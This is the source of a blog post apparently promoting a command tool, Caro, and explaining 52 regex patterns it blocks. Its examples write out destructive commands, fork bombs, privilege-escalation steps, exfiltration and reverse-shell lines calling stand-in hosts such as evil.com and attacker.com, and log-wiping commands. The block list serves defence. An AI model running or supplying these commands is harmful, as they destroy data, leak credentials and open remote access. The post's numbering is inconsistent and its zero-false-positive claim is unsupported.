---
import BlogPost from '../../layouts/BlogPost.astro';
---

<BlogPost
  title="52 Regex Patterns That Could Save Your Server"
  description="We compiled every dangerous shell pattern so you don't have to learn them the hard way. From fork bombs to privilege escalationâ€”a complete guide to command safety."
  date="2026-03-04"
  readTime="10 min read"
>

<div class="highlight">
  <p>
    <strong>The list:</strong> Every dangerous command pattern we block in Caro, explained. Bookmark this. Share it with your team. These patterns represent hard-learned lessons from system administrators worldwide.
  </p>
</div>

<h2>Why 52 Patterns?</h2>

<p>
  When we started building Caro's safety system, we asked sysadmins, DevOps engineers, and security researchers one question: <em>"What command would ruin your day?"</em>
</p>

<p>
  The answers filled a spreadsheet. Then another. We categorized, deduplicated, and refined until we had 52 distinct patterns covering the most dangerous shell operations. Each pattern is a lesson someone learned the hard way.
</p>

<h2>Category 1: Destructive File Operations</h2>

<p>
  The classics. Commands that delete, overwrite, or corrupt data irreversibly.
</p>

<h3>Pattern 1: Recursive Force Delete</h3>
<pre><code># BLOCKED: rm -rf /
rm\s+-[rf]+\s+/

# Why: Deletes entire filesystem
# Variations caught: rm -rf /, rm -fr /, rm -r -f /</code></pre>

<h3>Pattern 2: Home Directory Wipe</h3>
<pre><code># BLOCKED: rm -rf ~
rm\s+-[rf]+\s+(~|$HOME|\$HOME)

# Why: Deletes all user data
# Variations: rm -rf ~, rm -rf $HOME, rm -rf ~/</code></pre>

<h3>Pattern 3: Wildcard Root Delete</h3>
<pre><code># BLOCKED: rm -rf /*
rm\s+-[rf]+\s+/\*

# Why: Same effect as rm -rf /, just sneakier
# Note: Some people think this is "safer" - it's not</code></pre>

<h3>Pattern 4: Hidden File Delete</h3>
<pre><code># BLOCKED: rm -rf .*
rm\s+-[rf]+\s+\.\*

# Why: Deletes all hidden files including ..
# Risk: Can traverse up and delete parent directories</code></pre>

<h2>Category 2: Disk and Filesystem Attacks</h2>

<p>
  Commands that destroy or corrupt storage at the block level.
</p>

<h3>Pattern 5: Disk Zero-Fill</h3>
<pre><code># BLOCKED: dd if=/dev/zero of=/dev/sda
dd\s+if=/dev/(zero|random|urandom)\s+of=/dev/

# Why: Overwrites entire disk with zeros
# Recovery: Impossible without backups</code></pre>

<h3>Pattern 6: Filesystem Format</h3>
<pre><code># BLOCKED: mkfs.ext4 /dev/sda1
mkfs(\.[a-z0-9]+)?\s+/dev/

# Why: Formats filesystem, destroying all data
# Variations: mkfs.ext4, mkfs.xfs, mkfs -t ext4</code></pre>

<h3>Pattern 7: Partition Table Destruction</h3>
<pre><code># BLOCKED: fdisk /dev/sda <<< "d"
(fdisk|parted|gdisk)\s+/dev/\w+\s*(&lt;&lt;|&lt;|[|])

# Why: Modifying partition tables via pipe is almost always destructive
# Safe use: Interactive fdisk with careful confirmation</code></pre>

<h2>Category 3: Fork Bombs and Resource Exhaustion</h2>

<p>
  Commands that consume all system resources, requiring a hard reboot.
</p>

<h3>Pattern 8: Classic Fork Bomb</h3>
<pre><code># BLOCKED: :()&#123; :|:& &#125;;:
:.*\(\).*&#123;.*:\|.*&

# Why: Exponentially spawns processes until system crashes
# Explanation: Function : calls itself twice, backgrounded</code></pre>

<h3>Pattern 9: Bash Fork Bomb</h3>
<pre><code># BLOCKED: bomb() &#123; bomb | bomb & &#125;; bomb
\w+\(\)\s*&#123;\s*\w+\s*\|\s*\w+\s*&

# Why: Same as above, just more readable
# Both are equally devastating</code></pre>

<h3>Pattern 10: Memory Exhaustion</h3>
<pre><code># BLOCKED: cat /dev/zero | head -c 100G > /dev/shm/bomb
cat\s+/dev/zero.*>\s*/dev/shm

# Why: Fills RAM-backed filesystem
# Effect: OOM killer starts terminating processes</code></pre>

<h2>Category 4: Privilege Escalation</h2>

<p>
  Commands that grant excessive permissions or switch to powerful users.
</p>

<h3>Pattern 11: World-Writable Root</h3>
<pre><code># BLOCKED: chmod 777 /
chmod\s+777\s+/

# Why: Makes entire filesystem writable by anyone
# Security: Complete compromise of file permissions</code></pre>

<h3>Pattern 12: Recursive Permission Change</h3>
<pre><code># BLOCKED: chmod -R 777 /
chmod\s+-R\s+777\s+/

# Why: Recursively makes everything world-writable
# Recovery: Requires restoring permissions from backup</code></pre>

<h3>Pattern 13: SUID Bit Escalation</h3>
<pre><code># BLOCKED: chmod u+s /bin/sh
chmod\s+[ugo]*\+s\s+/(bin|usr)

# Why: Creates setuid root shells
# Exploit: Any user can become root</code></pre>

<h3>Pattern 14: Ownership Change Root</h3>
<pre><code># BLOCKED: chown -R user:user /
chown\s+-R\s+\w+:\w+\s+/

# Why: Changes ownership of entire filesystem
# Effect: System becomes unbootable</code></pre>

<h2>Category 5: Network Exfiltration</h2>

<p>
  Commands that send data to external servers.
</p>

<h3>Pattern 15: Curl to Shell</h3>
<pre><code># BLOCKED: curl http://evil.com/script.sh | bash
curl\s+[^|]*\|\s*(bash|sh|zsh)

# Why: Executes untrusted remote code
# Note: We block this in generated commands, not user input</code></pre>

<h3>Pattern 16: Sensitive File Upload</h3>
<pre><code># BLOCKED: curl -X POST -d @/etc/passwd http://evil.com
curl.*-d\s+@/(etc|home).*http

# Why: Exfiltrates sensitive files
# Files at risk: /etc/passwd, /etc/shadow, ~/.ssh/*</code></pre>

<h3>Pattern 17: Netcat Reverse Shell</h3>
<pre><code># BLOCKED: nc -e /bin/sh attacker.com 4444
nc\s+(-e|--exec)\s+/(bin|usr).*\s+\d+

# Why: Opens reverse shell to attacker
# Use case: Only legitimate in authorized pentesting</code></pre>

<h2>Category 6: Critical System Paths</h2>

<p>
  Any modification to these paths is blocked or warned.
</p>

<h3>Pattern 18-25: Protected Directories</h3>
<pre><code># BLOCKED/WARNED: Operations targeting:
/bin, /sbin, /lib, /lib64        # System binaries
/usr, /usr/bin, /usr/lib         # User programs
/etc, /etc/passwd, /etc/shadow   # Configuration
/boot, /boot/grub                # Boot system
/var/log                         # Audit logs
/sys, /proc                      # Kernel interfaces</code></pre>

<h2>Category 7: History and Audit Evasion</h2>

<p>
  Commands that hide their tracks.
</p>

<h3>Pattern 26: History Disable</h3>
<pre><code># WARNED: unset HISTFILE
unset\s+HIST(FILE|SIZE|CONTROL)

# Why: Disables command history
# Red flag: Usually precedes malicious activity</code></pre>

<h3>Pattern 27: History Clear</h3>
<pre><code># WARNED: history -c && rm ~/.bash_history
history\s+-c|rm\s+.*history

# Why: Destroys audit trail
# Legitimate use: Rare, usually for removing credentials</code></pre>

<h2>Category 8: Compression Bombs</h2>

<p>
  Archives that expand to consume all disk space.
</p>

<h3>Pattern 28: Recursive Decompression</h3>
<pre><code># WARNED: Nested archives from untrusted sources
tar\s+-[xz]+f\s+.*\.(tar\.gz|tgz)\s*$

# Why: May contain recursive compression
# Defense: Check archive contents first with -t flag</code></pre>

<h2>The Complete List</h2>

<p>
  Here are all 52 patterns, organized by category:
</p>

<h3>Destructive Operations (1-10)</h3>
<ol>
  <li><code>rm -rf /</code> - Root deletion</li>
  <li><code>rm -rf ~</code> - Home deletion</li>
  <li><code>rm -rf /*</code> - Wildcard root deletion</li>
  <li><code>rm -rf .*</code> - Hidden file deletion</li>
  <li><code>dd if=/dev/zero</code> - Disk wipe</li>
  <li><code>mkfs</code> - Filesystem format</li>
  <li><code>fdisk | pipe</code> - Partition destruction</li>
  <li><code>> /dev/sda</code> - Direct disk write</li>
  <li><code>shred /dev/</code> - Secure disk erase</li>
  <li><code>wipefs</code> - Filesystem signature wipe</li>
</ol>

<h3>Resource Exhaustion (11-18)</h3>
<ol start="11">
  <li><code>:()&#123; :|:& &#125;;:</code> - Classic fork bomb</li>
  <li><code>bomb() &#123; bomb | bomb & &#125;</code> - Named fork bomb</li>
  <li><code>cat /dev/zero > /dev/shm</code> - Memory fill</li>
  <li><code>yes > /dev/null &</code> (repeated) - CPU exhaustion</li>
  <li><code>while true; do</code> (no sleep) - Infinite loop</li>
  <li><code>tail -f /dev/zero</code> - Memory exhaustion</li>
  <li><code>cat /dev/urandom > file</code> - Disk fill</li>
  <li><code>$((i++)) recursion</code> - Stack overflow</li>
</ol>

<h3>Privilege Escalation (19-28)</h3>
<ol start="19">
  <li><code>chmod 777 /</code> - World-writable root</li>
  <li><code>chmod -R 777</code> - Recursive world-writable</li>
  <li><code>chmod u+s</code> - SUID escalation</li>
  <li><code>chown -R / </code> - Ownership takeover</li>
  <li><code>sudo su -</code> - Root shell</li>
  <li><code>visudo | pipe</code> - Sudoers modification</li>
  <li><code>passwd root</code> - Root password change</li>
  <li><code>usermod -aG sudo</code> - Grant sudo access</li>
  <li><code>setcap cap_setuid</code> - Capability escalation</li>
  <li><code>echo >> /etc/sudoers</code> - Direct sudoers edit</li>
</ol>

<h3>Network Threats (29-38)</h3>
<ol start="29">
  <li><code>curl | bash</code> - Remote code execution</li>
  <li><code>wget -O- | sh</code> - Remote code execution</li>
  <li><code>curl -d @/etc/</code> - File exfiltration</li>
  <li><code>nc -e /bin/sh</code> - Reverse shell</li>
  <li><code>socat exec:</code> - Reverse shell variant</li>
  <li><code>python -c socket</code> - Python reverse shell</li>
  <li><code>bash -i >& /dev/tcp</code> - Bash reverse shell</li>
  <li><code>scp to external</code> - Data exfiltration</li>
  <li><code>rsync to external</code> - Data exfiltration</li>
  <li><code>ssh tunnel</code> - Unauthorized tunnel</li>
</ol>

<h3>System Corruption (39-46)</h3>
<ol start="39">
  <li><code>> /etc/passwd</code> - User database wipe</li>
  <li><code>> /etc/shadow</code> - Password database wipe</li>
  <li><code>mv /bin</code> - Binary directory move</li>
  <li><code>rm /lib</code> - Library deletion</li>
  <li><code>kill -9 1</code> - Init process kill</li>
  <li><code>pkill -9 -u root</code> - All root processes kill</li>
  <li><code>halt/poweroff/reboot</code> - System shutdown</li>
  <li><code>init 0</code> - Immediate shutdown</li>
</ol>

<h3>Audit Evasion (47-52)</h3>
<ol start="47">
  <li><code>unset HISTFILE</code> - Disable history</li>
  <li><code>history -c</code> - Clear history</li>
  <li><code>rm ~/.bash_history</code> - Delete history file</li>
  <li><code>shred ~/.bash_history</code> - Secure delete history</li>
  <li><code>> /var/log/</code> - Log truncation</li>
  <li><code>rm /var/log/</code> - Log deletion</li>
</ol>

<h2>Implementation Details</h2>

<p>
  All patterns are pre-compiled at startup for zero runtime overhead:
</p>

<pre><code>use once_cell::sync::Lazy;
use regex::Regex;

static DANGEROUS_PATTERNS: Lazy&lt;Vec&lt;CompiledPattern&gt;&gt; = Lazy::new(|| &#123;
    PATTERNS.iter()
        .map(|p| CompiledPattern &#123;
            regex: Regex::new(p.pattern).unwrap(),
            severity: p.severity,
            description: p.description,
        &#125;)
        .collect()
&#125;);</code></pre>

<p>
  Validation runs in under 1ms for any command length.
</p>

<h2>Contributing New Patterns</h2>

<p>
  Found a dangerous pattern we missed? Open a PR:
</p>

<pre><code># 1. Add pattern to src/safety/patterns.rs
# 2. Add test case that should be blocked
# 3. Add test case that should NOT be blocked (avoid false positives)
# 4. Run test suite: cargo test --package caro --lib safety</code></pre>

<p>
  Every pattern requires both positive and negative test cases. We maintain 0% false positives.
</p>

<h2>Get Protected</h2>

<pre><code># Install Caro with safety validation
bash <(curl --proto '=https' --tlsv1.2 -sSfL https://setup.caro.sh)

# All 52 patterns are active by default
$ caro "delete all files on my computer"

Command blocked: This operation matches dangerous pattern #1
Pattern: Recursive force deletion from root
Risk level: CRITICAL

Cannot execute this command.</code></pre>

<hr style="margin: 50px 0; border: none; border-top: 1px solid #e0e0e0;">

<p style="text-align: center; margin-top: 40px;">
  <em>52 Patterns | 0% False Positives | Your Server, Protected</em>
</p>

</BlogPost>
